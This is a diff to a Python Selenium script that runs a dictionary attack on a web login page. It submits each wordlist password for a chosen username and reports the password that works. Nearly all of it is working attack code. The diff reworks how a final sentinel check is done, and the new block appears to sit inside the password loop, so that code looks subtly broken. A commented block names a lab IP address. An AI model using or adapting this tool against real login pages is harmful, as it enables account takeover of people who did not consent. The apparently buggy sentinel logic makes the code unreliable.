@@ -61,6 +61,7 @@ def get_request():
 
 def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
     final_pass = None
+    man = "mandatorylastcheckthatcannotbeaviablepasswordcuzthatwouldbeawkwardafuknowwhatimsayinlolxdlol"
     sys.stdout.write(color.BLUE+'\n[~] '+ 'Checking if URL is reachable... '+color.END)
     sys.stdout.flush()
     try:
@@ -78,82 +79,67 @@ def brutes(username, usr_sel ,pass_sel,button_sel,word_list, url, delay):
         sys.exit(color.RED+'\n[!] '+ 'Keyboard interrupt'+color.END)
     else:
         pass
-    
-    with open(word_list, 'a') as w:
-        w.write('mandatorylastcheck')
-                
-    f = open(word_list, 'r')
     optionss = webdriver.ChromeOptions()
     optionss.add_argument("--disable-popup-blocking")
     optionss.add_argument("--disable-extensions")
     driver = webdriver.Chrome(service = Service(chromedriver))
     print (color.GREEN+'[*] Starting dictionary attack against '+color.YELLOW+username+color.GREEN+' with a '+color.YELLOW+delay+color.GREEN+' seconds delay\n'+color.END)
-    for passwd in f:
-        try:
-            driver.get(url)
-            Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
-            Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
-            driver.find_element(By.CSS_SELECTOR, button_sel)
-            Sel_user.send_keys(username)
-            if passwd != 'mandatorylastcheck':
+    with open(word_list, 'r') as f:
+        for passwd in f:
+            try:
+                driver.get(url)
+                Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
+                Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
+                driver.find_element(By.CSS_SELECTOR, button_sel)
+                Sel_user.send_keys(username)
                 print(color.BLUE+"[~] Attempting password "+color.YELLOW+passwd+color.END, end='')
-            else:
-                pass
-            Sel_pas.send_keys(passwd)
-            time.sleep(int(delay))
-            final_pass = passwd
+                Sel_pas.send_keys(passwd)
+                time.sleep(int(delay))
+                final_pass = passwd
 
-            # Get status_code using Javascript (Doesn't work yet)
+                # Get status_code using Javascript (Doesn't work yet)
 
-            # js = '''
-            # let callback = arguments[0];
-            # let xhr = new XMLHttpRequest();
-            # xhr.open('GET', ' '''+str(url)+''' ', 'http://10.10.203.148/login', true);
-            # xhr.onload = function () {
-            #     if (this.readyState === 4) {
-            #         callback(this.status);
-            #     }
-            # };
-            # xhr.onerror = function () {
-            #     callback('error');
-            # };
-            # xhr.send(null);
-            # '''
+                # js = '''
+                # let callback = arguments[0];
+                # let xhr = new XMLHttpRequest();
+                # xhr.open('GET', ' '''+str(url)+''' ', 'http://10.10.203.148/login', true);
+                # xhr.onload = function () {
+                #     if (this.readyState === 4) {
+                #         callback(this.status);
+                #     }
+                # };
+                # xhr.onerror = function () {
+                #     callback('error');
+                # };
+                # xhr.send(null);
+                # '''
 
-            # status_code = driver.execute_async_script(js)
-            # print(status_code) 
+                # status_code = driver.execute_async_script(js)
+                # print(status_code) 
 
-        except KeyboardInterrupt:
-            with open(word_list, "r") as f:
-                    lines = f.readlines()
-            with open(word_list, "w") as f:
-                for line in lines:
-                    if line.strip("\n") != 'mandatorylastcheck':
-                        f.write(line)
-            sys.exit(color.RED+'\n[!] User interrupt'+color.END)
-        except selenium.common.exceptions.NoSuchElementException:
-            if final_pass == None:
-                with open(word_list, "r") as f:
-                    lines = f.readlines()
-                with open(word_list, "w") as f:
-                    for line in lines:
-                        if line.strip("\n") != 'mandatorylastcheck':
-                            f.write(line)
-                sys.exit(color.RED+'\n[+] An error occured'+color.END)
-            else:
-                with open(word_list, "r") as f:
-                    lines = f.readlines()
-                with open(word_list, "w") as f:
-                    for line in lines:
-                        if line.strip("\n") != 'mandatorylastcheck':
-                            f.write(line)
-                sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
-    with open(word_list, "r") as f:
-        lines = f.readlines()
-    with open(word_list, "w") as f:
-        for line in lines:
-            if line.strip("\n") != 'mandatorylastcheck':
-                f.write(line)
+            except KeyboardInterrupt:
+                sys.exit(color.RED+'\n[!] User interrupt'+color.END)
+            except selenium.common.exceptions.NoSuchElementException:
+                if final_pass == None:
+                    sys.exit(color.RED+'\n[+] An error occured'+color.END)
+                else:
+                    sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
+            try:
+                driver.get(url)
+                Sel_user = driver.find_element(By.CSS_SELECTOR, usr_sel)
+                Sel_pas = driver.find_element(By.CSS_SELECTOR, pass_sel)
+                driver.find_element(By.CSS_SELECTOR, button_sel)
+                Sel_user.send_keys(username)
+                Sel_pas.send_keys(man)
+                time.sleep(int(delay))
+                final_pass = man
+            except KeyboardInterrupt:
+                sys.exit(color.RED+'\n[!] User interrupt'+color.END)
+            except selenium.common.exceptions.NoSuchElementException:
+                if final_pass == None:
+                    sys.exit(color.RED+'\n[+] An error occured'+color.END)
+                else:
+                    sys.exit(color.GREEN+'\nPassword found: '+color.PURPLE+final_pass+color.END)
     sys.exit(color.RED+'\n[-] Password not found'+color.END)
 
 def banner():
@@ -176,13 +162,14 @@ pass_sel = args.password_selector
 button_sel = args.login_selector
 url = args.url
 word_list = args.wordlist
-
+if not os.path.exists(word_list):
+    sys.exit(color.RED+'\n[-] Invalid wordlist path'+color.END)
 if not os.access(word_list, os.R_OK):
-        sys.exit(color.RED+'\n[-] Please give your wordlist reading permissions'+color.END)
-if not os.access(word_list, os.W_OK):
-        sys.exit(color.RED+'\n[-] Please give your wordlist writing permissions'+color.END)
+    sys.exit(color.RED+'\n[-] Please give your wordlist reading permissions'+color.END)
         
 chromedriver = args.chromedriver
+if not os.path.exists(chromedriver):
+    sys.exit(color.RED+'\n[-] Invalid chromedriver path'+color.END)
 delay = args.delay
 
 try:
